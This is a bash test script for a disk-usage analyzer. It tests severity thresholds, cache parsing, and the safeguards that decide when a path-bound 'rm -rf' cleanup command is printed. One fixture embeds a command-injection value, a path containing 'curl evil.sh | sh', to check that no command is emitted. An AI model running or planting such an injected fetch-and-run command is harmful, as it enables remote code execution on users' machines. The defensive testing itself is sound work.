#!/usr/bin/env bash
# Fixture tests for the disk analyzer (plan §6 U4).
#
# The shebang is load-bearing (handoff §4.15): zsh does not word-split unquoted
# variables, so this must be a FILE run under bash, never pasted into a shell.
#
# Everything here is hand-written cache files and hand-written fact rows: no
# real disk is measured, and the only filesystem this touches is its own mktemp
# sandbox (needed by the two re-stat cases, which are about the filesystem by
# construction). That is what the §3b two-function split buys — disk_findings
# is pure, so most of these assertions never leave memory.
#
# The numbers are checkable on paper. The 422 GiB volume is this machine's
# /System/Volumes/Data as recorded in §3c:
#   used 421562020 + avail 20725496 = 442287516 KB = volume_total_kb (422 GiB)
# and avail is 4.7% of it. df's Size column (482797652) is the APFS container
# and is never a denominator.
set -uo pipefail
export LC_ALL=C

REPO="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")/.." && pwd)"
pass=0; fail=0
ok()  { pass=$((pass + 1)); printf '  \033[32mok\033[0m    %s\n' "$1"; }
bad() { fail=$((fail + 1)); printf '  \033[31mFAIL\033[0m  %s\n' "$1"; }

. "$REPO/tools/advise-disk.sh"

TMP=$(mktemp -d) || exit 1
trap 'rm -rf "$TMP"' EXIT

# ------------------------------------------------------------- the volumes --
# 422 GiB (this machine), 4.7% avail
V_USED=421562020; V_AVAIL=20725496; V_DF=482797652; V_TOTAL=442287516
# 300 GiB
G300=314572800
# 200 GiB
G200=209715200
# 4 TB
T4=4294967296

OUT=''

pure() {   # <used> <avail> <df> [rows on stdin]
  OUT=$(disk_findings ok "$1" "$2" "$3" /System/Volumes/Data 3600)
}
pure_body() {  # <used> <avail> <df> <body>
  OUT=$(printf '%s\n' "$4" | disk_findings ok "$1" "$2" "$3" /System/Volumes/Data 3600)
}
from_cache() { OUT=$( CLAUDE_WATCH_DISK_CACHE=$1 advise_disk 2>/dev/null ); }

sfield() { printf '%s\n' "$OUT" | awk -F'\t' '$1=="S"{print $(ENVIRON["N"]); exit}' ; }
S()      { N=$1 sfield; }
ffield() { printf '%s\n' "$OUT" | awk -F'\t' '$1=="F" && $3==ENVIRON["FID"]{print $(ENVIRON["N"]); exit}'; }
F()      { FID=$1 N=$2 ffield; }
nfind()  { printf '%s\n' "$OUT" | grep -c '^F' ; }

eq() {  # <desc> <got> <want>
  if [ "$2" = "$3" ]; then ok "$1"; else bad "$1 (got '$2', wanted '$3')"; fi
}
has() { # <desc> <haystack> <needle>
  case $2 in *"$3"*) ok "$1" ;; *) bad "$1 (missing '$3' in '$2')" ;; esac
}
hasnt() {
  case $2 in *"$3"*) bad "$1 (found '$3' in '$2')" ;; *) ok "$1" ;; esac
}

# =========================================================== volume severity ==
echo "volume severity (AND, not or)"

pure "$V_USED" "$V_AVAIL" "$V_DF" < /dev/null
eq "4.7% avail -> critical"            "$(S 3)" critical
eq "  domain measured"                 "$(S 4)" complete
eq "  volume finding severity"         "$(F disk.volume_low 4)" critical
eq "  value is avail_kb"               "$(F disk.volume_low 6)" "$V_AVAIL"
eq "  unit"                            "$(F disk.volume_low 7)" kb
eq "  threshold is 25 GiB in kb"       "$(F disk.volume_low 8)" 26214400
eq "  threshold knob"                  "$(F disk.volume_low 9)" CLAUDE_WATCH_DISK_CRIT_GIB
eq "  share is used/volume_total"      "$(F disk.volume_low 5)" 0.953
eq "  confidence n/a, no reclaim"      "$(F disk.volume_low 10)/$(F disk.volume_low 11)" "0/n/a"
has "  headline names the numbers"     "$(F disk.volume_low 12)" "4.7% free — 19.8 GiB of 422 GiB"
has "  detail names both knobs"        "$(F disk.volume_low 13)" "under the 10% line (CLAUDE_WATCH_DISK_CRIT_PCT) AND under the 25 GiB line"
has "  detail refuses the df size"     "$(F disk.volume_low 13)" "460 GiB APFS container, which is not the denominator"
eq "  no action on a volume finding"   "$(F disk.volume_low 14)" ""

# 15% on a 300 GiB volume: 45 GiB free, under 20% AND under 50 GiB -> warn.
pure $(( G300 - G300 * 15 / 100 )) $(( G300 * 15 / 100 )) 0 < /dev/null
eq "15% of 300 GiB (45 GiB) -> warn"   "$(S 3)" warn
eq "  warn knob is named"              "$(F disk.volume_low 9)" CLAUDE_WATCH_DISK_WARN_GIB

# NOTE — §6 U4's verify list says "15% avail on a 422 GiB volume (warn)". That
# predates the AND fix in the same document: 15% of 422 GiB is 63.3 GiB, which
# is NOT under the 50 GiB warn line, so under AND it is `ok`. Pinned here
# deliberately, because it is the same failure class as the 4 TB case below.
pure $(( V_TOTAL - V_TOTAL * 15 / 100 )) $(( V_TOTAL * 15 / 100 )) "$V_DF" < /dev/null
eq "15% of 422 GiB (63 GiB) -> ok"     "$(S 3)" ok
eq "  and emits no finding"            "$(nfind)" 0

pure $(( V_TOTAL - V_TOTAL * 60 / 100 )) $(( V_TOTAL * 60 / 100 )) "$V_DF" < /dev/null
eq "60% avail -> ok"                   "$(S 3)" ok
eq "  no findings"                     "$(nfind)" 0
eq "  still measured, not unknown"     "$(S 4)" complete
has "  summary says what was checked"  "$(S 6)" "60.0% free"

# THE REGRESSION TEST: 4 TB volume, 399 GiB free. 9.7% is under the 10% line,
# but 399 GiB is nowhere near the 25 GiB line. With `or` this reports critical
# — a constant verdict wearing a number's clothes.
pure $(( T4 - 399 * 1048576 )) $(( 399 * 1048576 )) 0 < /dev/null
eq "4 TB with 399 GiB free -> ok"      "$(S 3)" ok
eq "  no volume finding"               "$(nfind)" 0
has "  summary shows the TiB size"     "$(S 6)" "9.7% free (399 GiB of 4.0 TiB)"

echo "volume threshold boundaries"
# crit percent line: exactly 10% is not "< 10%".
pure $(( G200 - G200 / 10 )) $(( G200 / 10 )) 0 < /dev/null
eq "avail exactly 10% -> warn"         "$(S 3)" warn
pure $(( G200 - G200 / 10 + 1 )) $(( G200 / 10 - 1 )) 0 < /dev/null
eq "avail one KB under 10% -> crit"    "$(S 3)" critical
# crit GiB line on a 300 GiB volume (8.3% avail, so the percent test passes).
pure $(( G300 - 26214400 )) 26214400 0 < /dev/null
eq "avail exactly 25 GiB -> warn"      "$(S 3)" warn
pure $(( G300 - 26214399 )) 26214399 0 < /dev/null
eq "avail one KB under 25 GiB -> crit" "$(S 3)" critical
# warn GiB line: 12% of a 500 GiB volume is 60 GiB -> over the 50 GiB line.
pure $(( 524288000 - 62914560 )) 62914560 0 < /dev/null
eq "12% but 60 GiB free -> ok"         "$(S 3)" ok
pure $(( 524288000 - 52428800 )) 52428800 0 < /dev/null
eq "10.0% and exactly 50 GiB -> ok"    "$(S 3)" ok
pure $(( 524288000 - 52428799 )) 52428799 0 < /dev/null
eq "one KB under 50 GiB -> warn"       "$(S 3)" warn
# warn percent line, both sides. On a 200 GiB volume 20% is 40 GiB, so the
# GiB half of the AND passes and the percent half is the one under test.
pure $(( G200 - G200 / 5 )) $(( G200 / 5 )) 0 < /dev/null
eq "avail exactly 20% -> ok"           "$(S 3)" ok
pure $(( G200 - G200 / 5 + 1 )) $(( G200 / 5 - 1 )) 0 < /dev/null
eq "avail one KB under 20% -> warn"    "$(S 3)" warn

# ============================================================ group findings ==
echo "reclaimable groups"
# 2% of 442287516 = 8845750.32 KB.
BOUND_IN="group	rebuildable	8845751	4	0"
BOUND_OUT="group	rebuildable	8845750	4	0"

pure_body "$V_USED" "$V_AVAIL" "$V_DF" "$BOUND_IN"
eq "group at 2% + 1 KB is surfaced"    "$(F disk.reclaimable.rebuildable 3)" disk.reclaimable.rebuildable
eq "  threshold is 2% of the volume"   "$(F disk.reclaimable.rebuildable 8)" 8845751
eq "  threshold knob"                  "$(F disk.reclaimable.rebuildable 9)" CLAUDE_WATCH_DISK_GROUP_WARN_PCT
eq "  reclaim_kb is the group size"    "$(F disk.reclaimable.rebuildable 10)" 8845751

pure_body "$V_USED" "$V_AVAIL" "$V_DF" "$BOUND_OUT"
eq "group at 2% - 1 KB is not shown"   "$(nfind)" 1
has "  summary says nothing qualified" "$(S 6)" "no group over 2% of the volume"

# Inheritance: severity copied from disk.volume_low, never downward.
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	26738688	57	0"
eq "critical volume promotes group"    "$(F disk.reclaimable.rebuildable 4)" critical
eq "  share is the group's own"        "$(F disk.reclaimable.rebuildable 5)" 0.060
pure_body $(( V_TOTAL - V_TOTAL * 60 / 100 )) $(( V_TOTAL * 60 / 100 )) "$V_DF" "group	rebuildable	26738688	57	0"
eq "ok volume never demotes group"     "$(F disk.reclaimable.rebuildable 4)" warn
pure_body $(( G300 - G300 * 15 / 100 )) $(( G300 * 15 / 100 )) 0 "group	rebuildable	26738688	57	0"
eq "warn volume promotes group to warn" "$(F disk.reclaimable.rebuildable 4)" warn

pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	26738688	57	0"
has "reclaim total is always a floor"  "$(S 6)" "(a floor)"
has "  headline says floor too"        "$(F disk.reclaimable.rebuildable 12)" "a floor"
has "  detail carries the rebuild cost" "$(F disk.reclaimable.rebuildable 13)" "a Rust target takes minutes to tens of minutes"

# ============================================================== partial scans ==
echo "partial scans"
# Per-group capping: one affected group, one not. The volume finding comes from
# df, which always completes, so it keeps its true severity.
PART="scan	1	0	3	3
note	permission_denied	3	-	-
group	rebuildable	26738688	57	0
group	caches	13369344	9	1"
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "$PART"
eq "domain is partial"                 "$(S 4)" partial
eq "  reason maps to the §3e enum"     "$(S 5)" scan_permission_denied
eq "  volume keeps its severity"       "$(F disk.volume_low 4)" critical
eq "  domain severity still critical"  "$(S 3)" critical
eq "  unaffected group not capped"     "$(F disk.reclaimable.rebuildable 4)" critical
eq "  affected group capped at info"   "$(F disk.reclaimable.caches 4)" info
has "  capped group says why"          "$(F disk.reclaimable.caches 13)" "capped at info because the scan could not measure all of it"
has "  summary leads with E9 verbatim" "$(S 6)" "disk scan could not read 3 directories (permission denied) — the sizes below are a floor. Grant Full Disk Access to your terminal in System Settings > Privacy & Security, or narrow CLAUDE_WATCH_REPO_ROOTS"
has "  remedy is the E9 string"        "$(S 7)" "Grant Full Disk Access to your terminal"
case $(S 6) in "disk scan could not read"*) ok "  reason really leads" ;; *) bad "  reason really leads" ;; esac

DEAD="scan	1	1	12	40
note	deadline	1	-	-
group	rebuildable	26738688	57	1"
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "$DEAD"
eq "deadline maps to scan_deadline"    "$(S 5)" scan_deadline
has "  summary leads with E5 verbatim" "$(S 6)" "disk scan stopped at its 120s deadline after 12 of 40 roots — the sizes below are a floor, not a total. Narrow CLAUDE_WATCH_REPO_ROOTS, or re-run claude-watch disk --refresh when the machine is idle"
eq "  affected group capped"           "$(F disk.reclaimable.rebuildable 4)" info

# A 5th column of '-' is a cache from an older scanner: treat it as affected=0.
OLD="scan	1	0	3	3
note	depth_capped	2	-	-
group	rebuildable	26738688	57	-"
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "$OLD"
eq "missing affected flag = not capped" "$(F disk.reclaimable.rebuildable 4)" critical
eq "  depth_capped has no enum value"  "$(S 5)" ""
eq "  but the domain is still partial" "$(S 4)" partial
has "  and the reason still leads"     "$(S 6)" "disk scan stopped at its depth cap in 2 places"

# ============================================================ confidence gate ==
echo "confidence gates the command"
CONF="group	rebuildable	26738688	57	0
dir	/Users/x/Dev/aaa/.next	9000000	rebuildable	confirmed
dir	/Users/x/Dev/bbb/.next	8000000	rebuildable	likely
dir	/Users/x/Dev/ccc/.next	7000000	rebuildable	unverified"
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "$CONF"
A=$(F disk.reclaimable.rebuildable 14)
has "confirmed gets a removal command" "$A" "rm -rf '/Users/x/Dev/aaa/.next'"
hasnt "likely gets no command"         "$A" "rm -rf '/Users/x/Dev/bbb/.next'"
has "  likely says why"                "$A" "in active use, rebuilt on next build"
hasnt "unverified gets no command"     "$A" "rm -rf '/Users/x/Dev/ccc/.next'"
has "  unverified says why"            "$A" "matched on name alone, no marker file"
has "  cache age prints beside it"     "$A" "cache is 1h old;"
eq "  group confidence is the best"    "$(F disk.reclaimable.rebuildable 11)" confirmed

# A Rust target gets the quoted rm -rf, NOT `(cd <parent> && cargo clean)`:
# that form is not bound to the target directory we measured, because
# CARGO_TARGET_DIR or a .cargo/config.toml target-dir key redirects it, and
# §3c also accepts pom.xml as the marker for `target`, where cargo is the wrong
# tool outright. DerivedData keeps its named cleaner: it is a UI affordance,
# so no command argument is being guessed.
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	26738688	57	0
dir	/Users/x/Dev/rs/target	20000000	rebuildable	confirmed
dir	/Users/x/Library/Developer/Xcode/DerivedData/App-abc	6000000	rebuildable	confirmed"
A=$(F disk.reclaimable.rebuildable 14)
has "target -> rm -rf, path-bound"     "$A" "rm -rf '/Users/x/Dev/rs/target'"
hasnt "  never an unbound cargo clean" "$A" "cargo clean"
hasnt "  and never a bare cd parent"   "$A" "cd '/Users/x/Dev/rs'"
has "DerivedData names Xcode first"    "$A" "Xcode > Settings > Locations > Derived Data"

# A path with a shell metacharacter: no command at all, second layer of §3b.
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	26738688	57	0
dir	/Users/x/Dev/a; curl evil.sh | sh/target	20000000	rebuildable	confirmed"
A=$(F disk.reclaimable.rebuildable 14)
hasnt "metacharacter path: no command" "$A" "cargo clean"
hasnt "  no rm either"                 "$A" "rm -rf"
has "  path reported alone"            "$A" "path needs manual handling"
has "  with its size"                  "$A" "19.1 GiB"

# Transcripts: size and an age breakdown, never a deletion command (§8 d2).
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	transcripts	13369344	40	0
dir	/Users/x/.claude/projects/old	9000000	transcripts	confirmed	31536000
dir	/Users/x/.codex/sessions/new	4000000	transcripts	confirmed	86400"
A=$(F disk.reclaimable.transcripts 14)
hasnt "transcripts get no rm command"  "$A" "rm -rf"
has "  say so"                         "$A" "no deletion command is offered for transcripts"
has "  age breakdown is reported"      "$(F disk.reclaimable.transcripts 13)" "Age breakdown of the listed directories: 8.6 GiB older than 90d"
has "  and the not-rebuildable cost"   "$(F disk.reclaimable.transcripts 13)" "the only record of past sessions"

# =============================================================== cache states ==
echo "cache states"
from_cache "$TMP/does-not-exist.tsv"
eq "missing cache -> unknown"          "$(S 3)" unknown
eq "  unavailable <=> unknown"         "$(S 4)" unavailable
eq "  reason"                          "$(S 5)" cache_missing
eq "  summary is E10 verbatim"         "$(S 6)" "disk: never scanned, so nothing here is measured. This takes about 10 seconds and is then cached for 6h. Run: claude-watch disk --refresh"
eq "  remedy is E10 too"               "$(S 7)" "disk: never scanned, so nothing here is measured. This takes about 10 seconds and is then cached for 6h. Run: claude-watch disk --refresh"
eq "  and never a finding"             "$(nfind)" 0

NOW=$(date +%s)
good_cache() {  # writes a well-formed cache to $1, extra rows from $2
  printf 'epoch\t-\t%s\t-\t-\nscan\t0\t0\t3\t3\nvol\t/System/Volumes/Data\t%s\t%s\t%s\n%s\n' \
    "$NOW" "$V_USED" "$V_AVAIL" "$V_DF" "$2" > "$1"
}

good_cache "$TMP/ok.tsv" "group	rebuildable	26738688	57	0"
from_cache "$TMP/ok.tsv"
eq "well-formed cache parses"          "$(S 3)" critical
eq "  measurement complete"            "$(S 4)" complete
eq "  no reasons when complete"        "$(S 5)" ""
eq "  no remedy when complete"         "$(S 7)" ""

: > "$TMP/empty.tsv"
from_cache "$TMP/empty.tsv"
eq "empty cache -> cache_missing"      "$(S 5)" cache_missing

printf 'epoch\t-\t%s\t-\t-\nscan\t0\t0\t3\t3\n' "$NOW" > "$TMP/trunc.tsv"
from_cache "$TMP/trunc.tsv"
eq "truncated (no vol row) -> unknown" "$(S 3)" unknown
eq "  unavailable"                     "$(S 4)" unavailable
eq "  reason"                          "$(S 5)" cache_malformed
eq "  never a garbage finding"         "$(nfind)" 0
has "  remedy names the file and fix"  "$(S 7)" "do not parse, so nothing here is measured. Delete that file and re-run: claude-watch disk --refresh"

printf 'epoch\t-\t%s\t-\t-\nscan\t0\t0\t3\t3\nvol\t/x\tlots\t20725496\t0\n' "$NOW" > "$TMP/nan.tsv"
from_cache "$TMP/nan.tsv"
eq "non-numeric used_kb -> malformed"  "$(S 5)" cache_malformed

printf 'epoch\t-\t%s\t-\t-\nscan\t0\t0\t3\t3\nnote\tdeadline\t1\t-\t-\nvol\t/x\t%s\t%s\t0\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/note.tsv"
from_cache "$TMP/note.tsv"
eq "note row without partial=1 -> bad" "$(S 5)" cache_malformed

printf 'epoch\t-\t%s\t-\t-\nvol\t/x\t%s\t%s\t0\ndir\t/p\t100\trebuildable\tmaybe\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/conf.tsv"
from_cache "$TMP/conf.tsv"
eq "unknown confidence -> malformed"   "$(S 5)" cache_malformed

printf 'epoch\t-\t%s\t-\t-\nvol\t/x\t%s\t%s\t0\nfuture\ta\tb\tc\td\ngroup\trebuildable\t26738688\t57\t0\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/fwd.tsv"
from_cache "$TMP/fwd.tsv"
eq "unknown row kind is tolerated"     "$(S 3)" critical

# The affected flag gates the per-group severity cap, so an unrecognised value
# must not fail open into "not affected" — that is the path from one malformed
# row to an inherited-critical finding with a removal command attached.
good_cache "$TMP/aff2.tsv" "group	rebuildable	26738688	57	2"
from_cache "$TMP/aff2.tsv"
eq "affected=2 -> cache_malformed"     "$(S 5)" cache_malformed
eq "  and no finding escapes"          "$(nfind)" 0
good_cache "$TMP/affdash.tsv" "group	rebuildable	26738688	57	-"
from_cache "$TMP/affdash.tsv"
eq "affected='-' is the legacy field"  "$(S 3)" critical
# ...and the pure half caps rather than releases if one ever reaches it.
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "scan	1	0	3	3
note	depth_capped	1	-	-
group	rebuildable	26738688	57	2"
eq "unknown affected fails closed"     "$(F disk.reclaimable.rebuildable 4)" info

printf 'epoch\t-\t%s\t-\t-\nvol\t/x\t%s\t%s\tbogus\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/df.tsv"
from_cache "$TMP/df.tsv"
eq "non-numeric df_size_kb -> bad"     "$(S 5)" cache_malformed
printf 'epoch\t-\t%s\t-\t-\nvol\t/x\t%s\t%s\t-\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/dfdash.tsv"
from_cache "$TMP/dfdash.tsv"
eq "df_size_kb '-' is accepted"        "$(S 3)" critical
hasnt "  and no container claim made"  "$(F disk.volume_low 13)" "APFS container"

printf 'epoch\t-\t%s\t-\t-\nscan\t0\t0\t3\t3\nscan\t1\t0\t1\t3\nvol\t/x\t%s\t%s\t0\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/dup.tsv"
from_cache "$TMP/dup.tsv"
eq "duplicate scan rows -> malformed"  "$(S 5)" cache_malformed

printf 'epoch\t-\t%s\t-\t-\nvol\t/x\t%s\t%s\t0\t42\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/wide.tsv"
from_cache "$TMP/wide.tsv"
eq "a sixth field -> malformed"        "$(S 5)" cache_malformed
printf 'epoch\t-\t%s\t-\t-\nvol\t/x\t%s\t%s\t0\ngroup\treb	uildable\t100\t1\t0\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/tabbed.tsv"
from_cache "$TMP/tabbed.tsv"
eq "a tab inside a field -> malformed" "$(S 5)" cache_malformed

printf 'epoch\t-\t%s\t-\t-\nepoch\t-\t%s\t-\t-\nvol\t/x\t%s\t%s\t0\n' "$NOW" "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/dupe.tsv"
from_cache "$TMP/dupe.tsv"
eq "duplicate epoch rows -> malformed" "$(S 5)" cache_malformed

# =========================================================== the re-stat gate ==
# This is the one section that touches a real filesystem, because the gate it
# tests is about the filesystem. Each case below is built so that exactly ONE
# reason to downgrade is present: the tree is otherwise cold and the marker is
# otherwise there, so a passing assertion pins that specific reason.
echo "revalidation before printing a command"
OLD=$(date -v-60d +%Y%m%d%H%M.%S)
# TMP is under /var, which is a symlink to /private/var on macOS, so the
# command must name the resolved object rather than the cached string.
TMPR=$(cd -P -- "$TMP" && pwd -P)

mk_target() {  # <parent> — a cold Rust target tree with its marker in place
  mkdir -p "$1/target/debug/deps"
  : > "$1/Cargo.toml"
  : > "$1/target/debug/deps/libfoo.rlib"
  : > "$1/target/marker"
  # Children before parents: writing a child bumps the parent's mtime.
  touch -t "$OLD" "$1/target/debug/deps/libfoo.rlib" "$1/target/marker" \
                  "$1/target/debug/deps" "$1/target/debug" "$1/target" \
                  "$1/Cargo.toml" "$1"
}
probe_cache() {  # <name> <dir> -> runs advise_disk over a cache naming <dir>
  good_cache "$TMP/$1.tsv" "group	rebuildable	26738688	57	0
dir	$2	20000000	rebuildable	confirmed"
  from_cache "$TMP/$1.tsv"
}

mk_target "$TMP/cold"
probe_cache cold "$TMP/cold/target"
has "cold + marker: command printed"   "$(F disk.reclaimable.rebuildable 14)" "rm -rf '$TMPR/cold/target'"
eq "  confidence stays confirmed"      "$(F disk.reclaimable.rebuildable 11)" confirmed
has "  command names the resolved path" "$(F disk.reclaimable.rebuildable 14)" "$TMPR/cold/target"

# NESTED activity. Every depth-1 mtime is still 60 days old; only a file three
# levels down was written. A depth-1 probe calls this idle and authors a
# deletion for a live build cache.
mk_target "$TMP/nested"
touch "$TMP/nested/target/debug/deps/libfoo.rlib"
touch -t "$OLD" "$TMP/nested/target/debug/deps" "$TMP/nested/target/debug" "$TMP/nested/target"
probe_cache nested "$TMP/nested/target"
A=$(F disk.reclaimable.rebuildable 14)
hasnt "nested write: no command"       "$A" "rm -rf"
has "  downgraded to likely"           "$A" "in active use, rebuilt on next build"
eq "  and the group says so"           "$(F disk.reclaimable.rebuildable 11)" likely

# MARKER gone: the tree is cold, but the Cargo.toml that made it `confirmed`
# has been deleted, so the cached verdict describes something absent.
mk_target "$TMP/nomarker"
rm -f "$TMP/nomarker/Cargo.toml"
probe_cache nomarker "$TMP/nomarker/target"
hasnt "marker deleted: no command"     "$(F disk.reclaimable.rebuildable 14)" "rm -rf"
eq "  downgraded"                      "$(F disk.reclaimable.rebuildable 11)" likely

# §3c also accepts pom.xml as the marker for `target`. Still confirmed, and
# still an rm -rf rather than a Rust cleaner pointed at a Maven directory.
mk_target "$TMP/maven"
rm -f "$TMP/maven/Cargo.toml"
: > "$TMP/maven/pom.xml"; touch -t "$OLD" "$TMP/maven/pom.xml" "$TMP/maven"
probe_cache maven "$TMP/maven/target"
eq "pom.xml is a valid marker too"     "$(F disk.reclaimable.rebuildable 11)" confirmed
hasnt "  and cargo is not invoked"     "$(F disk.reclaimable.rebuildable 14)" cargo

# A kind with no re-derivable marker gets no command however cold it is.
mkdir -p "$TMP/mystery/blob"; touch -t "$OLD" "$TMP/mystery/blob" "$TMP/mystery"
probe_cache mystery "$TMP/mystery/blob"
hasnt "unknown kind: no command"       "$(F disk.reclaimable.rebuildable 14)" "rm -rf"

# The final component being a symlink: rm -rf would remove the link, not the
# tree, so the command would not do what its text says.
mk_target "$TMP/real"
ln -s "$TMP/real/target" "$TMP/linked-target"
probe_cache symlink "$TMP/linked-target"
hasnt "symlinked dir: no command"      "$(F disk.reclaimable.rebuildable 14)" "rm -rf"

mkdir -p "$TMP/hot/target"; : > "$TMP/hot/Cargo.toml"; : > "$TMP/hot/target/artifact"
probe_cache hot "$TMP/hot/target"
A=$(F disk.reclaimable.rebuildable 14)
hasnt "touched since the scan: no cmd" "$A" "rm -rf"
has "  downgraded to likely"           "$A" "in active use, rebuilt on next build"

probe_cache gone "$TMP/vanished/target"
hasnt "vanished dir gets no command"   "$(F disk.reclaimable.rebuildable 14)" "rm -rf"

# Both probe bounds must fail CLOSED. Each is forced by shrinking its constant.
save_e=$DISK_PROBE_ENTRIES; DISK_PROBE_ENTRIES=1
probe_cache budget "$TMP/cold/target"
hasnt "entry budget exhausted: no cmd" "$(F disk.reclaimable.rebuildable 14)" "rm -rf"
DISK_PROBE_ENTRIES=$save_e
save_s=$DISK_PROBE_SECONDS; DISK_PROBE_SECONDS=0
probe_cache clock "$TMP/cold/target"
hasnt "wall-clock budget spent: no cmd" "$(F disk.reclaimable.rebuildable 14)" "rm -rf"
DISK_PROBE_SECONDS=$save_s
probe_cache cold2 "$TMP/cold/target"
has "  and the bounds are restored"    "$(F disk.reclaimable.rebuildable 14)" "rm -rf"

# The entry cap boundary, both sides. The probe only returns idle when the walk
# printed its completion sentinel, and head cuts that sentinel off exactly when
# the tree is larger than the cap — so a tree of EXACTLY the cap completes and
# one entry more does not. Counted from the tree itself, never hard-coded.
CE=$(find "$TMP/cold/target" | grep -c '')
save_e=$DISK_PROBE_ENTRIES
DISK_PROBE_ENTRIES=$CE
probe_cache capat "$TMP/cold/target"
has "tree exactly at the entry cap: cmd" "$(F disk.reclaimable.rebuildable 14)" "rm -rf"
DISK_PROBE_ENTRIES=$(( CE - 1 ))
probe_cache capover "$TMP/cold/target"
hasnt "one entry over the cap: no cmd"  "$(F disk.reclaimable.rebuildable 14)" "rm -rf"
DISK_PROBE_ENTRIES=$save_e

# An unreadable subtree must fail CLOSED. BSD find exits 1 and prints a short
# list with no sentinel; before the completion sentinel existed that read as
# "no recent entry found" = idle, and authored an rm -rf for a tree nobody
# could inspect. Root can read anything, so root skips rather than lies.
if [ "$(id -u)" = 0 ]; then
  ok "unreadable subtree fails closed (skipped: running as root)"
else
  mk_target "$TMP/permfail"
  mkdir -p "$TMP/permfail/target/locked"; : > "$TMP/permfail/target/locked/f"
  touch -t "$OLD" "$TMP/permfail/target/locked/f" "$TMP/permfail/target/locked" \
                  "$TMP/permfail/target" "$TMP/permfail"
  chmod 000 "$TMP/permfail/target/locked"
  probe_cache permfail "$TMP/permfail/target"
  A=$(F disk.reclaimable.rebuildable 14)
  hasnt "unreadable subtree: no command" "$A" "rm -rf"
  eq "  and downgraded to likely"        "$(F disk.reclaimable.rebuildable 11)" likely
  chmod 755 "$TMP/permfail/target/locked"
fi

# The 14d boundary, pinned without a wall-clock race. `find -newer` is strict,
# so an entry sitting exactly on the stamp reads as idle — which is precisely
# why disk_body builds the stamp at `date -v-14d -v-1S`, one second BEFORE the
# cutoff, so that "exactly 14 days old" comes out active.
BT=$TMP/boundary; mkdir -p "$BT/tree"; : > "$BT/tree/entry"
touch -t "$OLD" "$BT/tree/entry" "$BT/tree"
: > "$BT/at"; : > "$BT/before"
touch -r "$BT/tree/entry" "$BT/at"                    # stamp == entry mtime
# Derived from the entry itself, not from `date`: anything wall-clock based
# here races the fixture's own runtime and the test flakes by a second.
EM=$(stat -f %m "$BT/tree/entry")
touch -t "$(date -r $((EM - 1)) +%Y%m%d%H%M.%S)" "$BT/before"  # stamp == entry - 1s
if disk_probe_idle "$BT/tree" "$BT/at"; then ok "entry exactly at the stamp reads idle"
else bad "entry exactly at the stamp reads idle"; fi
if disk_probe_idle "$BT/tree" "$BT/before"; then bad "one second of slack makes it active"
else ok "one second of slack makes it active"; fi
# The two above pin the semantics; this pins the WIRING — that disk_body really
# builds its stamp with DISK_IDLE_SLACK_S applied. Widening the slack to 100
# days must drag the 60-day-old cold tree onto the active side of the cutoff.
save_k=$DISK_IDLE_SLACK_S; DISK_IDLE_SLACK_S=$(( 100 * 86400 ))
probe_cache slack "$TMP/cold/target"
hasnt "slack is wired into the stamp"  "$(F disk.reclaimable.rebuildable 14)" "rm -rf"
DISK_IDLE_SLACK_S=$save_k

# E4 material: the age prints beside every command and names staleness past 6h.
NOW6=$(( NOW - 30000 ))
printf 'epoch\t-\t%s\t-\t-\nscan\t0\t0\t3\t3\nvol\t/System/Volumes/Data\t%s\t%s\t%s\ngroup\trebuildable\t26738688\t57\t0\ndir\t%s\t20000000\trebuildable\tconfirmed\n' \
  "$NOW6" "$V_USED" "$V_AVAIL" "$V_DF" "$TMP/cold/target" > "$TMP/stale.tsv"
from_cache "$TMP/stale.tsv"
has "stale cache is named as stale"    "$(F disk.reclaimable.rebuildable 14)" "cache is 8h old (stale, refreshed every 6h);"
from_cache "$TMP/cold.tsv"
A=$(F disk.reclaimable.rebuildable 14)
has "fresh cache still prints an age"  "$A" "cache is "
hasnt "  but does not call it stale"   "$A" "(stale, refreshed every 6h)"

# ================================================================== thresholds ==
echo "threshold overrides"
r=$( CLAUDE_WATCH_DISK_CRIT_PCT=40 disk_findings ok "$V_USED" "$V_AVAIL" "$V_DF" / 0 < /dev/null )
eq "raising the crit pct still crits"  "$(printf '%s\n' "$r" | awk -F'\t' '$1=="S"{print $3}')" critical
r=$( CLAUDE_WATCH_DISK_CRIT_GIB=1 disk_findings ok "$V_USED" "$V_AVAIL" "$V_DF" / 0 < /dev/null )
eq "lowering the crit GiB -> warn"     "$(printf '%s\n' "$r" | awk -F'\t' '$1=="S"{print $3}')" warn
r=$( CLAUDE_WATCH_DISK_GROUP_WARN_PCT=10 disk_findings ok "$V_USED" "$V_AVAIL" "$V_DF" / 0 <<< "group	rebuildable	26738688	57	0" )
eq "raising the group pct hides it"    "$(printf '%s\n' "$r" | grep -c '^F')" 1

for badv in 2.5 -1 abc ''; do
  ( CLAUDE_WATCH_DISK_GROUP_WARN_PCT="$badv" disk_findings ok "$V_USED" "$V_AVAIL" "$V_DF" / 0 < /dev/null ) >/dev/null 2>&1
  rc=$?
  if [ "$badv" = '' ]; then
    eq "empty override falls back"     "$rc" 0
  else
    eq "override '$badv' exits 2"      "$rc" 2
  fi
done

# ================================================================== invariants ==
echo "invariants"
all=''
for c in "$TMP/does-not-exist.tsv" "$TMP/trunc.tsv" "$TMP/ok.tsv" "$TMP/cold.tsv" "$TMP/hot.tsv" "$TMP/note.tsv"; do
  from_cache "$c"; all="$all$OUT"$'\n'
  st=$(S 4); sv=$(S 3)
